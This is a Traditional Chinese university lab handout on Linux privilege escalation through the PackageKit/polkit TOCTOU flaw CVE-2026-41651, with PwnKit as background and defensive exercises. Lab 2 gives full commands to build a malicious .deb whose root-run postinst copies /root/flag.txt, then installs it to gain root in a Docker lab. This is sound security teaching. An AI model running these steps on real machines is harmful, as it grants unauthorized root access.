# Week 12 — Linux 本地提權架構實驗室

**日期**：2026/05/11–05/17  
**時長**：3 小時（180 分鐘）  
**主題**：PackageKit、polkit 與 TOCTOU Race Condition  
**核心 CVE**：[CVE-2026-41651](https://nvd.nist.gov/vuln/detail/CVE-2026-41651)（Pack2TheRoot，CVSS 8.8）

[TOC]

---

## 一、課程目標

完成本實驗後，學生應能：

1. 解釋 Linux privilege separation 架構（DBus → PackageKit → polkit）
2. 理解 TOCTOU race condition 的原理與成因
3. 分析 CVE-2026-41651 的三個連鎖缺陷
4. 使用 Kali Linux 工具觀察 system authorization flow
5. 實際觸發本地提權並取得 root 存取
6. 提出具體的 defensive mitigation 方法

---

## 二、課程時間配置

| 時間 | 模組 | 類型 |
|------|------|------|
| 0:00–0:20 | Lecture：架構與威脅模型 | 講授 |
| 0:20–0:50 | Lab 1：System Recon | Guided |
| 0:50–1:40 | Lab 2：TOCTOU 攻擊 | Hands-on |
| 1:40–1:50 | Break | 休息 |
| 1:50–2:30 | Lab 3：防禦實作 | Hands-on |
| 2:30–3:00 | 報告撰寫 | 個人作業 |

---

## 三、環境準備（課前完成，**不佔課堂時間**）

### 3.1 安裝 Docker

```bash
sudo apt-get update
sudo apt-get install -y docker.io docker-compose-plugin
sudo systemctl start docker
sudo usermod -aG docker $USER
newgrp docker
```

### 3.2 啟動 Pack2TheRoot Lab

```bash
git clone https://github.com/dinosn/pack2theroot-lab.git
cd pack2theroot-lab
docker compose build && docker compose up -d
```

### 3.3 驗證環境

```bash
# 確認三個 container 都在跑
docker compose ps

# 進入 vulnerable container
ssh labuser@localhost -p 2222
# 密碼：labuser
```

看到 shell prompt 代表環境就緒，輸入 `exit` 離開。

---

## 四、Lecture — 架構與威脅模型（20 分鐘）

### 4.1 Linux 特權服務架構

普通使用者需要安裝套件時，不是直接呼叫 root，而是透過一層授權架構：

```
使用者（非 root）
       ↓
    DBus（system bus）
       ↓
  PackageKit daemon（pkd）
       ↓
    polkit（授權決策）
       ↓
  特權操作（安裝 / 移除套件）
```

這個設計的目的是**最小權限原則**：GUI 應用程式可在不持有 root 的情況下請求特權操作，由 polkit 集中決定是否允許。

### 4.2 兩個時代的 TOCTOU

同一套授權架構，四年內出現兩個性質相近的重大漏洞：

| CVE | 名稱 | 年份 | 漏洞位置 | CVSS |
|-----|------|------|---------|------|
| [CVE-2021-4034](https://nvd.nist.gov/vuln/detail/CVE-2021-4034) | PwnKit | 2022 | `pkexec.c`（polkit 執行器）| 7.8 |
| [CVE-2026-41651](https://nvd.nist.gov/vuln/detail/CVE-2026-41651) | Pack2TheRoot | 2026 | `pk-transaction.c`（PackageKit）| 8.8 |

---

#### CVE-2021-4034 — PwnKit（歷史背景）

**發現者**：Qualys Research Team  
**揭露日期**：2022 年 1 月 25 日  
**受影響系統**：所有裝有 polkit 的 Linux 發行版（Ubuntu、Debian、Fedora、RHEL、CentOS…）  
**影響範圍**：2009 年以來所有版本的 polkit，橫跨 12 年以上

**漏洞位置**：`pkexec.c`，polkit 的命令列執行器

**技術機制**：

`pkexec` 在初始化時會解析 `argv`，但對 `argc == 0` 的邊界條件處理有誤：
1. 若 `argc` 為 0，程式會從 `argv[1]` 讀取資料，但此位址實際上是 `envp[0]`（環境變數陣列）
2. 攻擊者可透過精心構造的環境變數，讓 `pkexec` 在 `execve()` 後的 `argv` 重建過程中寫入可控位址
3. 最終造成 out-of-bounds write，覆蓋環境變數為 `GCONV_PATH=.`，誘使 `pkexec` 載入攻擊者的惡意 library

**攻擊條件**：本地登入帳號（任何權限層級皆可），不需網路存取

**修補方式**：在 `pkexec.c` 加入 `argc == 0` 的邊界檢查，並使用 `secure_getenv()` 取代 `getenv()`

**歷史意義**：PwnKit 證明了安全架構的信任假設本身可能是漏洞所在——polkit 設計用來保護特權操作，但其執行器本身卻存在可被利用的記憶體錯誤。

---

#### CVE-2026-41651 — Pack2TheRoot（本週主角）

**發現者**：Deutsche Telekom Red Team  
**揭露日期**：2026 年 4 月 22 日  
**受影響系統**：Ubuntu 18.04–26.04、Debian Trixie 13.4、Rocky Linux 10.1、Fedora 43  
**受影響版本**：PackageKit 1.0.2–1.3.4（同樣跨越 12 年以上）  
**修補版本**：PackageKit 1.3.5

**漏洞位置**：`pk-transaction.c`，PackageKit 的交易管理核心

**與 PwnKit 的關鍵差異**：

PwnKit 是記憶體層的漏洞（out-of-bounds write）；Pack2TheRoot 是邏輯層的漏洞（TOCTOU + 狀態機缺陷）。前者需要記憶體利用技巧，後者只需要標準的套件管理工具。

**IOC**：系統日誌出現 `assertion failed: (!transaction->priv->emitted_finished)`

### 4.3 TOCTOU 原理

**Time-of-Check-Time-of-Use**：檢查（Check）與使用（Use）之間存在時間窗口，在窗口期間狀態被改變。

```
[授權檢查] 通過 ✓
     ↕  ← 這個窗口是漏洞所在
[執行操作] 使用已過期的授權結果
```

### 4.4 CVE-2026-41651 技術核心

Pack2TheRoot 的根本原因是 `pk-transaction.c` 中三個連鎖缺陷：

| # | 缺陷 | 說明 |
|---|------|------|
| 1 | State guard 缺失 | `InstallFiles()` 未驗證 transaction 當前狀態 |
| 2 | 狀態回退被靜默接受 | Backward state transition 不報錯 |
| 3 | Flag 讀取時機錯誤 | Cached transaction flags 在 dispatch 時才讀，非 authorization 時 |

**攻擊流程**：

攻擊者對同一個 transaction 發送兩個非同步 D-Bus 呼叫：
1. 第一個帶 `SIMULATE` flag → 通過 polkit 授權（只模擬，不實際安裝）
2. 第二個立即發送含惡意套件的請求

GLib event loop 的優先順序保證兩個訊息在 callback 執行前都被處理，polkit 授權被繞過，惡意套件的 post-install script 以 root 執行。

**影響範圍**：Ubuntu 18.04–26.04、Debian Trixie 13.4、Rocky Linux 10.1、Fedora 43。

**修補版本**：PackageKit 1.3.5（2026-04-22）。

---

## 五、Lab 1 — System Recon（0:20–0:50）

### 學習重點

- system bus 與 session bus 的差異
- PackageKit daemon 運作模式
- polkit action 與授權規則結構

### Step 1：進入環境，確認版本

```bash
ssh labuser@localhost -p 2222  # 密碼：labuser

# 確認 PackageKit 版本（應落在 1.0.2–1.3.4 受影響範圍）
pkcon --version

# 確認服務狀態
systemctl status packagekit --no-pager
```

**問題 1**：版本號是多少？是否在受影響範圍內？

### Step 2：監控 DBus 訊息流

開兩個 terminal：

```bash
# Terminal 1（監控）
dbus-monitor --system

# Terminal 2（觸發操作）
pkcon get-updates
```

觀察 Terminal 1 的輸出，找出 PackageKit 使用的 D-Bus interface 名稱。

**問題 2**：PackageKit 的 D-Bus service name 是什麼？

### Step 3：查詢 polkit 授權規則

```bash
# 列出所有 PackageKit 相關 action
pkaction | grep packagekit

# 查看安裝套件的授權規則（詳細模式）
pkaction --verbose --action-id org.freedesktop.packagekit.package-install
```

**Flag 1 任務**：找出 container 中 `allow_active` 設定過於寬鬆的 polkit action，截圖並記錄 action ID 與 allow_active 值。正常安全設定應為 `auth_admin`；若顯示 `yes`，即為本次漏洞的授權前提。

### Step 4：觀察 polkit 日誌

```bash
journalctl -u polkit -n 50 --no-pager
```

記錄觀察到的授權事件格式，供報告使用。

---

## 六、Lab 2 — TOCTOU 攻擊（0:50–1:40）

### 6.1 概念模擬：用 Python 理解 TOCTOU（20 分鐘）

在 Kali 本機（非 container）執行 Python 模擬：

```bash
# 觀察脆弱版本的行為
python3 toctou_demo.py --vulnerable
```

閱讀 `toctou_demo.py` 的 `vulnerable_daemon()` 完整實作，理解 check 和 use 之間的窗口。

**任務**：完成 `exploit_thread()` 的骨架（`# TODO` 標記處），可使用 Claude Code / Codex 輔助。攻擊成功後程式會印出模擬 flag。

完成後，執行 safe 模式確認理解：

```bash
python3 toctou_demo.py --safe
```

### 6.2 真實攻擊：Pack2TheRoot Docker Lab（30 分鐘）

回到 vulnerable container（port 2222）：

```bash
ssh labuser@localhost -p 2222  # 密碼：labuser
```

**Step 1**：確認套件格式

```bash
dpkg --version 2>/dev/null && echo "[*] 使用 deb 格式" || echo "[*] 使用 rpm 格式"
```

**Step 2**：建立惡意 .deb 套件

```bash
mkdir -p /tmp/evil-pkg/DEBIAN

cat > /tmp/evil-pkg/DEBIAN/control << 'EOF'
Package: lab-evil-pkg
Version: 1.0
Architecture: amd64
Maintainer: labuser
Description: Week 12 Lab Package
EOF

cat > /tmp/evil-pkg/DEBIAN/postinst << 'EOF'
#!/bin/bash
# 這個 script 以 root 身份執行
cat /root/flag.txt > /tmp/flag_captured.txt
chmod 644 /tmp/flag_captured.txt
id >> /tmp/flag_captured.txt
EOF

chmod 755 /tmp/evil-pkg/DEBIAN/postinst
dpkg-deb --build /tmp/evil-pkg /tmp/evil.deb
```

**Step 3**：透過 PackageKit 安裝（觸發漏洞）

```bash
pkcon install-local --allow-untrusted /tmp/evil.deb
```

**Step 4**：讀取 flag

```bash
cat /tmp/flag_captured.txt
```

**Flag 2 任務**：取得 `/root/flag.txt` 的完整內容（格式：`PACK2THEROOT{...}`），截圖。

### 6.3 比較 patched 版本（5 分鐘）

SSH 到 patched container（port 2223）：

```bash
ssh labuser@localhost -p 2223  # 密碼：labuser
```

重複 Step 3，觀察 polkit 的拒絕訊息，記錄差異供報告使用。

---

## 七、Lab 3 — 防禦實作（1:50–2:30）

### 7.1 Python 安全版本實作（25 分鐘）

```bash
# 先觀察不安全版本的 race condition
python3 transaction_demo.py --vulnerable
# 預期看到 balance 出現負數（double-spend）

# 實作 safe_execute() 後測試
python3 transaction_demo.py --safe
```

完成 `transaction_demo.py` 的 `safe_execute()` 骨架（`# TODO` 標記處），可使用 Claude Code / Codex 輔助。通過壓力測試後程式印出 Flag 3。

**實作提示**：
- 方法 A：使用 `threading.Lock()`，讓 check 和 execute 成為原子操作
- 方法 B：讀取一次狀態，不重複讀取（avoid re-check）
- 方法 C：使用 compare-and-swap 語意

**Flag 3 任務**：讓 safe 版本通過 1000 次壓力測試（balance 不為負數），截圖輸出結果。

### 7.2 討論：如何防禦 Pack2TheRoot？（15 分鐘）

Pack2TheRoot 的正式修補（PackageKit 1.3.5）方向：

- `InstallFiles()` 加入嚴格的 state guard
- Flags 在 authorization 時讀取並鎖定，不允許後續修改
- 拒絕 backward state transition，改為報錯

**更廣泛的防禦思考**：

| 層次 | 工具 / 方法 |
|------|------------|
| 套件版本 | 確認 PackageKit ≥ 1.3.5 |
| polkit hardening | 將 `allow_active` 從 `yes` 改為 `auth_admin` |
| 系統強化 | AppArmor profile、seccomp filter |
| 監控偵測 | `auditd`、Falco、`journalctl` IOC 監控 |

---

## 八、IOC 與偵測

若系統遭受 Pack2TheRoot 攻擊，可在系統日誌觀察到：

```bash
journalctl -u packagekit | grep "assertion failed"
# 預期輸出：assertion failed: (!transaction->priv->emitted_finished)
```

此 assertion failure 是 PackageKit daemon 崩潰的特徵，也是攻擊成功的副作用。

---

## 九、繳交說明

請依 `pentest-report-template.md` 格式，以**繁體中文**撰寫滲透測試報告，**每人一份**。

| 項目 | 要求 |
|------|------|
| 格式 | 依 template 填寫，存成 `.docx` |
| 截圖 | Flag 1、Flag 2、Flag 3 截圖必附 |
| 檔名 | `W12_滲透測試報告_學號_姓名.docx` |
| 截止 | 上課當週週日 23:59 |

---

## 十、延伸閱讀

- [Pack2TheRoot 原始技術分析 — Telekom Security](https://github.security.telekom.com/2026/04/pack2theroot-linux-local-privilege-escalation.html)
- [CVE-2026-41651 — NVD](https://nvd.nist.gov/vuln/detail/CVE-2026-41651)
- [CVE-2026-41651 — Ubuntu Security](https://ubuntu.com/security/CVE-2026-41651)
- [dinosn/pack2theroot-lab — CTF Docker Lab](https://github.com/dinosn/pack2theroot-lab)
- [PwnKit (CVE-2021-4034) — Qualys 原始技術分析](https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt)
- [polkit 架構說明 — freedesktop.org](https://www.freedesktop.org/software/polkit/docs/latest/)
